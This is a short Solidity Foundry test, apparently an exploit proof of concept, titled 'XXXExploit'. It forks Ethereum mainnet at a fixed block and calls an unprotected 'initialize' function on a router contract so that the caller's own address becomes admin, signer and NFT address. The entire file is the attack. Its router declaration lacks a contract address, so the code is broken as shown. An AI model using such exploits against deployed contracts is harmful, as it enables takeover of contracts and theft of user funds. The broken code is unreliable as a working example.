// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";
// import "./test/interfaces/IERC20.sol";

interface Irouter {
    function initialize(address, address[] memory factions, address _signer,address _nft) external;
}


contract XXXExploit is Test {

    Irouter bananarouter = Irouter();
    function setUp() public {
        // Forking Ethereum mainnet using a public RPC and a specific block
        vm.createSelectFork("https://rpc.ankr.com/eth", 20774735);
    }

    function testExploit() public {
        address admin = address(this);  // Example admin address
        address[] memory factions = new address[](2);
        factions[0] = address(this);   // Example faction addresses
        factions[1] = address(this);
        address signer = address(this); // Example signer address
        address nft = address(this);    // Example NFT address
        bananarouter.initialize(admin,factions,signer,nft);
    }
}